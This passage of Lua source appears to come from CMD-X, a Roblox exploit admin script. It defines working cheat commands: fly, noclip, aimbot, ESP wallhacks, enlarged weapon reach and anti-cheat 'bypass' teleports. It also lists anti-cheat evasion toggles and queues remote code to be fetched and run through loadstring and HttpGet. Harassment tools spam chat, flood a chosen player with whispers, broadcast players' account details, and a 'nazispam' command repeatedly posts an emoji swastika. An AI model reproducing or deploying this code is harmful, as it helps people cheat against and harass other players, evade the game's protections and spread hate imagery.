						if clicktplimit == 0 then
							hum.CFrame = hum.CFrame + direction * distance
						elseif distance > clicktplimit then
							hum.CFrame = hum.CFrame + direction * clicktplimit
						else
							hum.CFrame = hum.CFrame + direction * distance
						end
					end
				end
			end)
		end
	end

	function useCommand.clicktplimit()
		if arguments[2] == nil then
			return opx("*", "1 argument required!")
		end
		local value = tonumber(arguments[2])
		if value == nil then
			return opx("*", "Argument 1 must be a number")
		end

		clicktplimit = value

		return opx("-", ("Set clicktp distance limit to %s"):format(value))
	end

	function useCommand.unclicktplimit()
		clicktplimit = 0
		return opx("-", "Removed clicktp distance limit")
	end

	local infiniteJump = false
	function useCommand.infjump()
		opx("-","Infinite jump enabled")
		infiniteJump = true
		cmduis.JumpRequest:Connect(function()
			if infiniteJump == true then
				cmdlp.Character.Humanoid:ChangeState("Jumping")
			end
		end)
	end

	function useCommand.uninfjump()
		opx("-","Infinite jump disabled")
		infiniteJump = false
	end

	function useCommand.fly()
		FLYING = false
		cmdlp.Character.Humanoid.PlatformStand = false
		wait()
		opx("-","You are now flying")
		sFLY()
		speedofthefly = permflyspeed
	end

	function useCommand.vehiclefly()
		FLYING = false
		cmdlp.Character.Humanoid.PlatformStand = false
		wait()
		opx("-","You are now flying")
		sFLY(true)
		speedofthevfly = permflyspeed
	end

	function useCommand.unfly()
		opx("-","You are no longer flying")
		FLYING = false
		cmdlp.Character.Humanoid.PlatformStand = false
	end

	function useCommand.flyspeed()
		if arguments[2] then
			speedofthefly = arguments[2]
			speedofthevfly = arguments[2]
			opx("-","Fly speed was changed to "..arguments[2])
		else
			opx("*","A number is required")
		end
	end

	function useCommand.rejoin()
		rejoining = true
		if syn.queue_on_teleport then
			syn.queue_on_teleport('game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()')
		end
		opx("-","Rejoining game")
		game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId)
		wait(3)
		rejoining = false
	end

	function useCommand.removeinchar()
		if arguments[2] then
			CharGet = getstring(2)
			for _,v in pairs(cmdlp.Character:GetDescendants()) do
				if v.Name == CharGet then v:Destroy(); break end
			end
			opx("-","Removed "..CharGet.." from character")
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.runafter()
		if arguments[2] == "on" then
			opx("-","CMD-X will now run after rejoin")
			KeepCMDXOn = true
			if KeepCMDXOn and syn.queue_on_teleport then
				syn.queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()')
			end
			updatesaves()
		elseif arguments[2] == "off" then
			opx("-","CMD-X will no longer run after rejoin")
			KeepCMDXOn = false
			updatesaves()
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.game()
		if arguments[2] then
			rejoining = true
			if syn.queue_on_teleport then
				syn.queue_on_teleport('game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()')
			end
			game:GetService('TeleportService'):Teleport(arguments[2])
			opx("-","Teleporting to game "..arguments[2])
			wait(3)
			rejoining = false
		else
			opx("*","A server ID is needed")
		end
	end

	function useCommand.reach()
		if arguments[2] and cmdnum(arguments[2]) then
			for i,v in pairs(cmdlp.Character:GetDescendants()) do
				if v:IsA("Tool") then
					currentToolSize = v.Handle.Size
					local a = Instance.new("SelectionBox",v.Handle)
					a.Name = "SelectionBoxCreated"
					a.Adornee = v.Handle
					a.Color3 = Color3.new(255, 255, 255)
					a.LineThickness = 0.01
					v.Handle.Massless = true
					v.Handle.Size = Vector3.new(0.5,0.5,arguments[2])
					v.GripPos = Vector3.new(0,0,0)
					v.Parent = cmdlp.Backpack
					v.Parent = cmdlp.Character
				end
			end
			opx("-","Reach set to "..arguments[2])
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.boxreach()
		if arguments[2] and cmdnum(arguments[2]) then
			for i,v in pairs(cmdlp.Character:GetDescendants()) do
				if v:IsA("Tool") then
					currentToolSize = v.Handle.Size
					local a = Instance.new("SelectionBox",v.Handle)
					a.Name = "SelectionBoxCreated"
					a.Adornee = v.Handle
					a.Color3 = Color3.new(255, 255, 255)
					a.LineThickness = 0.01
					v.Handle.Massless = true
					v.Handle.Size = Vector3.new(arguments[2], arguments[2], arguments[2])
					v.GripPos = Vector3.new(0,0,0)
					v.Parent = cmdlp.Backpack
					v.Parent = cmdlp.Character
				end
			end
			opx("-","Box Reach set to "..arguments[2])
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unreach()
		for i,v in pairs(cmdlp.Character:GetDescendants()) do
			if v:IsA("Tool") then
				v.Handle.Size = Vector3.new(1,0.8,4)
				v.Parent = cmdlp.Backpack
				v.Parent = cmdlp.Character
			end
		end
		opx("-","Reach value cleared (1,0.8,4)")
	end

	function useCommand.freegotobp()
		if arguments[4] then
			opx("-","Bypass Teleported to "..arguments[2].." "..arguments[3].." "..arguments[4])
			game:GetService("TweenService"):Create(cmdlp.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(arguments[2], arguments[3], arguments[4])}):Play()
		else
			opx("*","4 arguments are required!")
		end
	end

	function useCommand.gotobppart()
		if arguments[2] then
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name == getstring(2) then
					opx("-","Bypass Teleported to part")
					cmdlp.Character.Humanoid.Jump = true
					game:GetService("TweenService"):Create(cmdlp.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = v.CFrame}):Play()
					break
				else
					opx("*","Part does not exist")
				end
			end
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.gotobpspawn()
		opx("-","Bypass Teleported to spawn")
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("SpawnLocation") then
				game:GetService("TweenService"):Create(cmdlp.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = v.CFrame}):Play()
				break
			end
		end
	end

	function useCommand.freegoto()
		if arguments[4] then
			opx("-","Teleported to "..arguments[2].." "..arguments[3].." "..arguments[4])
			cmdlp.Character.HumanoidRootPart.CFrame = CFrame.new(arguments[2], arguments[3], arguments[4])
		else
			opx("*","4 arguments are required!")
		end
	end

	function useCommand.onjoin()
		if arguments[2] then
			local xNewarg = getstring(2):split(" ")
			opx("-","OnJoin is now on")
			onJoin = true
			xGet = false
			cmdp.PlayerAdded:Connect(function(x)
				if onJoin then
					wait(.1)
					if xNewarg[2] == "plr" then xNewarg[2] = x.Name; xGet = true end
					arguments = xNewarg
					useCommand[xNewarg[1]]()
					if xGet then xNewarg[2] = "plr" end
				end
			end)
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.quickexit()
		game:Shutdown()
	end

	function useCommand.onleave()
		if arguments[2] then
			local xNewarg = getstring(2):split(" ")
			opx("-","OnLeave is now on")
			onLeave = true
			xGet = false
			cmdp.PlayerRemoving:Connect(function(x)
				if onLeave then
					wait(.1)
					if xNewarg[2] == "plr" then xNewarg[2] = x.Name; xGet = true end
					arguments = xNewarg
					useCommand[xNewarg[1]]()
					if xGet then xNewarg[2] = "plr" end
				end
			end)
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.unonjoin()
		opx("-","OnJoin is now off")
		onJoin = false
	end

	function useCommand.unonleave()
		opx("-","OnLeave is now off")
		onLeave = false
	end

	function useCommand.autorejoin()
		if arguments[2] == "on" then
			ifKickedAuto = true
			ifKicked()
			opx("-","Auto rejoin has been turned on")
			updatesaves()
		elseif arguments[2] == "off" then
			ifKickedAuto = false
			opx("-","Auto rejoin has been turned off")
			updatesaves()
		else
			opx("*","2 arguments are required!")
		end
	end


	function useCommand.friend()
		if arguments[2] == "all" then
			opx("-","Sent friend request to everyone")
			for i,v in pairs(cmdp:GetPlayers()) do
				cmdlp:RequestFriendship(v)
			end
		else
			target = findplr(arguments[2])
			if target then
				opx("-","Sent friend request to "..target.Name)
				cmdlp:RequestFriendship(target)
			else
				opx("*","Player does not exist!")
			end
		end
	end

	function useCommand.noclip()
		opx("-","Noclip enabled")
		noclip()
	end

	function useCommand.light()
		if arguments[2] then
			opx("-","Light/Brightness has been set to "..arguments[2])
			local bright = Instance.new("PointLight", cmdlp.Character.HumanoidRootPart)
			bright.Range = 35
			bright.Brightness = arguments[2]
		else
			opx("*","Light/Brightness is missing a number")
		end
	end

--[[function useCommand.anticheat()
	if arguments[2] == "scriptdetectoff" then
		if AntiCheat.ScriptDetectOff then
			AntiCheat.ScriptDetectOff = false
		else
			AntiCheat.ScriptDetectOff = true
		end
	elseif arguments[2] == "turbonamespam" then
		if AntiCheat.TurboNameSpam then
			AntiCheat.TurboNameSpam = false
		else
			AntiCheat.TurboNameSpam = true
		end
	elseif arguments[2] == "hideparentinexploit" then
		if AntiCheat.HideParentInExploit then
			AntiCheat.HideParentInExploit = false
		else
			AntiCheat.HideParentInExploit = true
		end
	elseif arguments[2] == "hideparentinpg" then
		if AntiCheat.HideParentInPG then
			AntiCheat.HideParentInPG = false
		else
			AntiCheat.HideParentInPG = true
		end
	elseif arguments[2] == "autoantikick" then
		if AntiCheat.AutoAntiKick then
			AntiCheat.AutoAntiKick = false
		else
			AntiCheat.AutoAntiKick = true
		end
	elseif arguments[2] == "removescripts" then
		if AntiCheat.RemoveScripts then
			AntiCheat.RemoveScripts = false
		else
			AntiCheat.RemoveScripts = true
		end
	elseif arguments[2] == "introaudiooff" then
		if AntiCheat.IntroAudioOff then
			AntiCheat.IntroAudioOff = false
		else
			AntiCheat.IntroAudioOff = true
		end
	elseif arguments[2] == "dontjumblenames" then
		if AntiCheat.DontJumbleNames then
			AntiCheat.DontJumbleNames = false
		else
			AntiCheat.DontJumbleNames = true
		end
	elseif arguments[2] == "onetimescramble" then
		if AntiCheat.OneTimeScramble then
			AntiCheat.OneTimeScramble = false
		else
			AntiCheat.OneTimeScramble = true
		end
	elseif arguments[2] == "printingoff" then
		if AntiCheat.PrintingOff then
			AntiCheat.PrintingOff = false
		else
			AntiCheat.PrintingOff = true
		end
	elseif arguments[2] == "nogui" then
		if AntiCheat.NoGui then
			AntiCheat.NoGui = false
		else
			AntiCheat.NoGui = true
		end
	end
	opx("-","Turned on anticheat variable")
	updatesaves()
end]]

	function useCommand.anticheats()
		opx("-","Listing all anticheat variables")
		opxL("Anticheats","ScriptDetectOff\nTurboNameSpam\nHideParentInExploit\nHideParentInPG\nAutoAntiKick\nRemoveScripts\nIntroAudioOff\nDontJumbleNames\nOneTimeScramble\nPrintingOff\nNoGui\nCustom1")
	end

	function useCommand.unlight()
		for i,v in pairs(cmdlp.Character.HumanoidRootPart:GetChildren()) do
			if v:IsA('PointLight') then
				v:Destroy()
				opx("-","Removed light/brightness from character")
			end
		end
		opx("-","Removed light/brightness from character")
	end

	Track = false

	function Create(xPlayer, xHead)
		local ESP = Instance.new("BillboardGui", cmdlp.PlayerGui)
		local ESPSquare = Instance.new("Frame", ESP)
		local ESPText = Instance.new("TextLabel", ESP)
		ESP.Name = "ESP"..xPlayer.Name
		ESP.Adornee = xHead
		ESP.AlwaysOnTop = true
		ESP.ExtentsOffset = Vector3.new(0, 1, 0)
		ESP.Size = UDim2.new(0, 5, 0, 5)
		for i,v in pairs(xPlayer.Character:GetChildren()) do
			if v:IsA("BasePart") then
				local a = Instance.new("BoxHandleAdornment", ESP)
				a.Name = xPlayer.Name
				a.Adornee = v
				a.AlwaysOnTop = true
				a.ZIndex = 0
				a.Size = v.Size
				a.Transparency = 0.5
				a.Color = xPlayer.TeamColor
				v.Material = "ForceField"
			end
		end
		ESPText.Name = "NAME"
		ESPText.BackgroundColor3 = Color3.new(255, 255, 255)
		ESPText.BackgroundTransparency = 1
		ESPText.BorderSizePixel = 0
		ESPText.Position = UDim2.new(0, 0, 0, -40)
		ESPText.Size = UDim2.new(1, 0, 10, 0)
		ESPText.Visible = true
		ESPText.ZIndex = 10
		ESPText.Font = Enum.Font.SourceSansSemibold
		ESPText.TextStrokeTransparency = 0.6
		ESPText.TextSize = 20
		if xPlayer.Team ~= nil then
			ESPText.Text = xPlayer.Name.." | ["..xPlayer.Character.Humanoid.Health.."/"..xPlayer.Character.Humanoid.MaxHealth.."] | "..xPlayer.Team
		else
			ESPText.Text = xPlayer.Name.." | ["..xPlayer.Character.Humanoid.Health.."/"..xPlayer.Character.Humanoid.MaxHealth.."] | FFA"
		end
		ESPText.TextColor = xPlayer.TeamColor
	end

	function Clear()
		for _,v in pairs(cmdlp.PlayerGui:GetChildren()) do
			if v.Name:sub(1,3) == "ESP" and v:IsA("BillboardGui") then
				v:Destroy()
			end
		end
	end

	function Find()
		Clear()
		Track = true
		while wait() do
			if Track then
				Clear() 
				for i,v in pairs(cmdp:GetPlayers()) do
					if v ~= cmdlp then
						if v.Character and v.Character:FindFirstChild("Head") then
							Create(v, v.Character.Head, true)
						end
					end
				end
			end
			wait(1)
		end
	end

	local ESPEnabled = false
	function useCommand.esp()
		opx("-","ESP Enabled")
		Find()
		ESPEnabled = true
		repeat
			wait()
			if ESPEnabled == true then
				Find()
			end
		until ESPEnabled == false
	end

	function useCommand.unesp()
		opx("-","ESP Disabled")
		ESPEnabled = false
		Track = false
		for i = 1,10 do
			for i,v in pairs(cmdp:GetPlayers()) do
				for x,y in pairs(v.Character:GetChildren()) do
					if y:IsA("BasePart") then
						y.Material = "Plastic"
					end
				end
			end
			Clear()
			wait()
		end
	end

	AimFor = "Head"

	function GetPlayer()
		CollectingPositions = {}
		PlrCollect = {}
		Players1 = {} 
		for i,v in pairs(cmdp:GetPlayers()) do
			if v ~= cmdlp then
				table.insert(Players1, v)
			end
		end
		if Teamed then
			for i,v in pairs(Players1) do
				if v and v.Character ~= nil and v.TeamColor ~= Plr.TeamColor then
					local Aim = v.Character:FindFirstChild(AimFor)
					if Aim ~= nil then
						local Pos = (Aim.Position - workspace.CurrentCamera.CoordinateFrame.p).magnitude
						local Ray  = Ray.new(workspace.CurrentCamera.CoordinateFrame.p, (cmdm.Hit.p - workspace.CurrentCamera.CoordinateFrame.p).unit * Pos)
						local Hit,Pos2  = workspace:FindPartOnRay(Ray, workspace)
						local Diff = math.floor((Pos2 - Aim.Position).magnitude)
						PlrCollect[v.Name..i] = {Dist = Pos, Player = v, Diff = Diff}
						table.insert(CollectingPositions, Diff)
					end
				end
			end
		else
			for i,v in pairs(Players1) do
				if v and v.Character ~= nil then
					local Aim = v.Character:FindFirstChild(AimFor)
					if Aim ~= nil then
						local Pos = (Aim.Position - workspace.CurrentCamera.CoordinateFrame.p).magnitude
						local Ray  = Ray.new(workspace.CurrentCamera.CoordinateFrame.p, (cmdm.Hit.p - workspace.CurrentCamera.CoordinateFrame.p).unit * Pos)
						local Hit,Pos2  = workspace:FindPartOnRay(Ray, workspace)
						local Diff = math.floor((Pos2 - Aim.Position).magnitude)
						PlrCollect[#PlrCollect+1] = {Dist = Pos, Player = v, Diff = Diff}
						table.insert(CollectingPositions, Diff)
					end
				end
			end
		end
		if unpack(CollectingPositions) == nil then
			return false
		end
		local MagDist = math.floor(math.min(unpack(CollectingPositions)))
		if MagDist > 20 then
			return false
		end
		for i,v in pairs(PlrCollect) do
			if v.Diff == MagDist then
				return v.Player
			end
		end
		return false
	end

	AimbotIs = false
	AimbotRunAlready = false
	function BodyAimbot(aimbotarg)
		local AimFor = "Head"
		if aimbotarg == "Team" then Teamed = true else Teamed = false end
		local Hotkey = 50
		AimbotIs = true
		opx("-","Aimbot enabled (Hold down Left Ctrl to aim)")
		if AimbotRunAlready then return end
		AimbotRunAlready = true
		cmdm.KeyDown:connect(function(Key)
			Key = Key:lower():byte()
			if AimbotIs and Key == Hotkey then
				AimbotEnabled = true
			end
		end)
		cmdm.KeyUp:connect(function(Key)
			Key = Key:lower():byte()
			if AimbotIs and Key == Hotkey then
				AimbotEnabled = false
			end
		end)
		game:GetService("RunService").RenderStepped:connect(function()
			if AimbotIs and AimbotEnabled then
				local TargetPlayer = GetPlayer()
				local Aim = TargetPlayer.Character:FindFirstChild(AimFor)
				if Aim ~= nil then
					if Aim then
						workspace.CurrentCamera.CoordinateFrame = CFrame.new(workspace.CurrentCamera.CoordinateFrame.p, Aim.CFrame.p)
					end
				end
			end
		end)
	end

	function useCommand.aimbot()
		if arguments[2] then
			BodyAimbot(arguments[2])
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.unaimbot()
		opx("-","Aimbot disabled")
		AimbotIs = false
	end

	function useCommand.spectate()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				opx("-",target.Name.." is now being viewed")
				workspace.CurrentCamera.CameraSubject = target.Character
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unspectate()
		opx("-","You are back to viewing your character")
		workspace.CurrentCamera.CameraSubject = cmdlp.Character
	end

	function useCommand.ageprivate()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				local Years = string.split(target.AccountAge/365,".")
				opx("-",target.Name.."(s) account is "..Years[1].." year(s) old or "..target.AccountAge.." day(s) old")
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.agepublic()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				local Years = string.split(target.AccountAge/365,".")
				opx("-",target.Name.."(s) account is "..Years[1].." year(s) old or "..target.AccountAge.." day(s) old")
				sayremote:FireServer(target.Name.."(s) account is "..Years[1].." year(s) old or "..target.AccountAge.." day(s) old", "All")
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.idprivate()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				opx("-",target.Name.."s User ID is "..target.UserId)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.idpublic()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				opx("-",target.Name.."s User ID is "..target.UserId)
				sayremote:FireServer(target.Name.."s User ID is "..target.UserId, "All")
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.vrprivate()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				if target.VRDevice == "" then
					opx("-",target.Name.." does not have a VR Device")
				else
					opx("-",target.Name.." is using a VR Device named "..target.VRDevice)
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.vrpublic()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				if target.VRDevice == "" then
					opx("-",target.Name.." does not have a VR Device")
					sayremote:FireServer(target.Name.." does not have a VR Device", "All")
				else
					opx("-",target.Name.." is using a VR Device named "..target.VRDevice)
					sayremote:FireServer(target.Name.." is using a VR Device named "..target.VRDevice, "All")
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	local hitler = false
	function useCommand.nazispam()
		opx("-","Heil hitler?")
		hitler = true
		function say(msg)
			sayremote:FireServer(msg, "All")
		end
		local red = "\240\159\143\174"
		local white = "\240\159\148\178"
		local init = string.rep(white, 5)
		local tri = string.rep(red, 3)
		local l = {}
		l[1] = init..tri..white..red..init
		l[2] = init..white..white..red..white..red..init
		l[3] = init..tri..red..red..init
		l[4] = init..red..white..red..white..white..init
		l[5] = init..red..white..tri..init
		while hitler do
			for i = 1,5 do
				say(l[i])
			end
			wait(15)
		end
	end

	function useCommand.unnazispam()
		opx("-","Nazi spam disabled")
		hitler = false
	end

	function useCommand.permspamspeed()
		if cmdnum(arguments[2]) then
			opx("-","Perm spam speed updated to "..arguments[2])
			permspamspeed = arguments[2]
			updatesaves()
		else
			opx("*","2 arguments are required for this command")
		end
	end

	function useCommand.clicktphotkey()
		if arguments[2] then
			hotkeyctp = arguments[2]
			updatesaves()
			opx("Hotkey set to "..arguments[2])
		else
			opx("A key is required")
		end
	end

	local spammies = false
	function useCommand.spam()
		speedofthespam = permspamspeed
		spammies = true
		local spamstring = getstring(2)
		if arguments[2] then
			opx("-","You are now spamming "..spamstring)
			while spammies do
				wait(speedofthespam)
				sayremote:FireServer(spamstring, "All")
			end
		else
			opx("*","Spam is missing text")
		end
	end

	function useCommand.unspam()
		opx("-","Stopped spamming")
		spammies = false
	end

	function useCommand.timepos()
		if cmdnum(arguments[2]) then
			local Boombox = workspace[cmdlp.Name]:FindFirstChildOfClass("Tool")
			for i,v in pairs(Boombox:GetDescendants()) do
				if v:IsA("Sound") then
					Sound = v
					break
				end
			end
			Sound.TimePosition = arguments[2]
			opx("-","Set time position to "..arguments[2])
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.backpackplay()
		opx("*","Remember to play your audio first!")
		opx("-","Now backpack playing, put away your boombox")
		bpplay = game:GetService("RunService").RenderStepped:Connect(function()
			for i,v in pairs(cmdlp.Backpack:GetDescendants()) do
				if v:IsA("Sound") then
					v.Playing = true
				end
			end
		end)
	end

	function useCommand.unbackpackplay()
		opx("-","Backpack play disabled")
		bpplay:Disconnect()
	end

	function useCommand.play()
		if tonumber(arguments[2]) then
			opx("*","Remember to use your boombox once first!")
			local Sounds = {}
			for i,v in pairs(cmdlp.Character:GetDescendants()) do
				if v:IsA("Tool") then
					for x,y in pairs(v:GetDescendants()) do
						if y:IsA("Sound") then
							y.SoundId = "http://www.roblox.com/asset/?id="..arguments[2]
							y.Playing = true
						end
					end
				end
			end
			for i,v in pairs(cmdlp.Backpack:GetDescendants()) do
				if v:IsA("Tool") then
					for x,y in pairs(v:GetDescendants()) do
						if y:IsA("Sound") then
							y.SoundId = "http://www.roblox.com/asset/?id="..arguments[2]
							y.Playing = true
						end
					end
				end
			end
			opx("-","Now playing "..arguments[2])
		else
			opx("*","2 arguments are required!")
		end
	end

	local pmspammies = false
	function useCommand.pmspam()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				speedofthespam = permspamspeed
				pmspammies = true
				local spamstring = getstring(3)
				opx("-","You are now spamming "..target.Name.." with "..spamstring)
				while pmspammies do
					wait(speedofthespam)
					sayremote:FireServer("/w "..target.Name.." "..spamstring, "All")
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unpmspam()
		opx("-","Stopped PM spamming")
		pmspammies = false
	end

	function useCommand.spamspeed()
		if cmdnum(arguments[2]) then
			speedofthespam = arguments[2]
			opx("-","Spam speed was set to "..arguments[2])
		else
			opx("*","Spamspeed is missing a number")
		end
	end

	function useCommand.dicepublic()
		opx("-","The dice was rolled")
		sayremote:FireServer("The dice rolled by "..cmdlp.Name.." rolled a ".. tostring(math.random(1, 6)), "All")
	end

	function useCommand.coronavirus()
		if arguments[2] then
			local tbl = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://coronavirus-19-api.herokuapp.com/countries/"..arguments[2]))
			opx("-","Cases: "..tbl["cases"]..", Deaths: "..tbl["deaths"]..", Recovered: "..tbl["recovered"]..", Active: "..tbl["active"])
			sayremote:FireServer(tbl['country'].."; ".."Cases: ".."uw"..tbl["cases"]..", Deaths: ".."uw"..tbl["deaths"]..", Recovered: ".."uw"..tbl["recovered"]..", Active: ".."uw"..tbl["active"], "All")
		else
			local tbl = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://coronavirus-19-api.herokuapp.com/all"))
			opx("-","Cases: "..tbl["cases"]..", Deaths: "..tbl["deaths"]..", Recovered: "..tbl["recovered"])
			sayremote:FireServer("World; ".."Cases: ".."uw"..tbl["cases"]..", Deaths: ".."uw"..tbl["deaths"]..", Recovered: ".."uw"..tbl["recovered"], "All")
		end
	end

	function useCommand.joindateprivate()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				local tbl = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/"..target.UserId))
				local Created = tbl["created"]:split("T")
				local Created2 = Created[2]:split(".")
				opx("-",target.Name.." joined on: "..Created[1].." "..Created2[1])
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.joindatepublic()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				local tbl = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/"..target.UserId))
				local Created = tbl["created"]:split("T")
				local Created2 = Created[2]:split(".")
				opx("-",target.Name.." joined on: "..Created[1].." "..Created2[1])
				sayremote:FireServer(target.Name.." joined on: pt"..Created[1].." pt"..Created2[1], "All")
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.diceprivate()
		opx("-","The dice rolled a "..tostring(math.random(1, 6)))
	end

	function useCommand.numberpublic()
		if arguments[3] then
			opx("-","Your random number is ".. tostring(math.random(arguments[2], arguments[3])))
			sayremote:FireServer(cmdlp.Name.." has picked a random number between "..arguments[2].." and "..arguments[3].." the number is ".. tostring(math.random(arguments[2], arguments[3])), "All")
		else
			opx("*","You need to pick 2 numbers")
		end
	end

	function useCommand.numberprivate()
		if arguments[3] then
			opx("-","Your random number is ".. tostring(math.random(arguments[2], arguments[3])))
		else
			opx("*","You need to pick 2 numbers")
		end
	end

	function useCommand.loadcustoms()
		opx("-","Scripts you can load were listed")
		xPins = #loadCustoms.." | "
		for i,v in pairs(loadCustoms) do
			xPins = xPins..loadCustoms[i].N..", "
		end
		opxL("Plugins",xPins)
	end

	function Locate(plr)
		for i,v in pairs(cmdlp.PlayerGui:GetChildren()) do
			if v.Name == plr.Name..'_LC' then
				v:Destroy()
			end
		end
		wait()
		if plr.Character and plr.Name ~= cmdlp.Name and not cmdlp.PlayerGui:FindFirstChild(plr.Name..'_LC') then
			local ESPholder = Instance.new("Folder", cmdlp.PlayerGui)
			ESPholder.Name = plr.Name..'_LC'
			for b,n in pairs(plr.Character:GetChildren()) do
				if n:IsA("BasePart") then
					local a = Instance.new("BoxHandleAdornment", ESPholder)
					a.Name = plr.Name
					a.Adornee = n
					a.AlwaysOnTop = true
					a.ZIndex = 0
					a.Size = n.Size
					a.Transparency = 0.8
					for i,m in pairs(plr.Character:GetChildren()) do
						if m:IsA("Part") or m:IsA("MeshPart") then
							if m.Name ~= "HumanoidRootPart" and m.Name ~= "Handle" or (m:IsA("Part")) then
								m.Material = "ForceField"
								a.Color = m.BrickColor
							end
						end
					end
				end
			end
			if plr.Character and plr.Character:FindFirstChild('Head') then
				local BillboardGui = Instance.new("BillboardGui", ESPholder)
				local TextLabel = Instance.new("TextLabel")
				BillboardGui.Adornee = plr.Character.Head
				BillboardGui.Name = plr.Name
				BillboardGui.Size = UDim2.new(0, 100, 0, 150)
				BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
				BillboardGui.AlwaysOnTop = true
				TextLabel.Parent = BillboardGui
				TextLabel.BackgroundTransparency = 1
				TextLabel.Position = UDim2.new(0, 0, 0, -60)
				TextLabel.Size = UDim2.new(0, 100, 0, 100)
				TextLabel.Font = Enum.Font.SourceSansSemibold
				TextLabel.TextSize = 20
				TextLabel.TextColor3 = Color3.new(1, 1, 1)
				TextLabel.TextStrokeTransparency = 0.6
				TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
				plr.CharacterAdded:Connect(function()
					if ESPholder ~= nil and ESPholder.Parent ~= nil then
						lcLoopFunc:Disconnect()
						ESPholder:Destroy()
						repeat wait(1) until plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid')
						Locate(plr)
					end
				end)
				local function lcLoop()
					if cmdlp.PlayerGui:FindFirstChild(plr.Name..'_LC') then
						if plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid') then
							TextLabel.Text = plr.Name.."|Studs: ".. math.floor((cmdlp.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude).."|Health: "..plr.Character.Humanoid.Health
						end
					else
						lcLoopFunc:Disconnect()
					end
				end
				lcLoopFunc = game:GetService("RunService").RenderStepped:Connect(lcLoop)
			end
		end
	end

	local autoObby = false
	function useCommand.autoobby()
		opx("-","Now Auto obbying")
		autoObby = true
		cmdlp.Character.Humanoid.Running:Connect(function(speed)
			if speed > 0 and autoObby == true and cmdlp.Character.Humanoid.FloorMaterial == Enum.Material.Air then
				cmdlp.Character.Humanoid:ChangeState("Jumping")
			end
		end)
	end

	function useCommand.unautoobby()
		opx("-","No longer Auto obbying")
		autoObby = false
	end

	autoPf = false
	function useCommand.autoplatform()
		opx("-","Now Auto platforming")
		autoPf = true
		cmdlp.Character.Humanoid.Running:Connect(function(speed)
			if speed > 0 and autoPf == true and cmdlp.Character.Humanoid.FloorMaterial == Enum.Material.Air then
				local pc = cmdlp.Character
				if pc then
					if pc:FindFirstChild("pf") then
						pc:FindFirstChild("pf").CFrame = pc.HumanoidRootPart.CFrame * CFrame.new(0,-3.5,0)
					else
						local pf = Instance.new('Part', pc)
						pf.Name = 'pf'
						pf.Transparency = 1
						pf.Size = Vector3.new(6,1,6)
						pf.Anchored = true
						pf.CFrame = pc.HumanoidRootPart.CFrame * CFrame.new(0,-3.5,0)
					end
				end
			else
				if cmdlp.Character:FindFirstChild("pf") then
					cmdlp.Character:FindFirstChild("pf"):Destroy()
				end
			end
		end)
	end

	function useCommand.unautoplatform()
		opx("-","No longer Auto platforming")
		autoPf = false
		if cmdlp.Character:FindFirstChild("pf") then
			cmdlp.Character:FindFirstChild("pf"):Destroy()
		end
	end

	function CheckTargets(check)
		for i,v in pairs(FindingTargets) do
			if v == check then
				return true
			end
		end
	end

	FindingTargets = {}
	function useCommand.find()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				table.insert(FindingTargets, target.Name)
				opx("-",target.Name.." is now being found")
				Create(target, target.Character.Head, true)
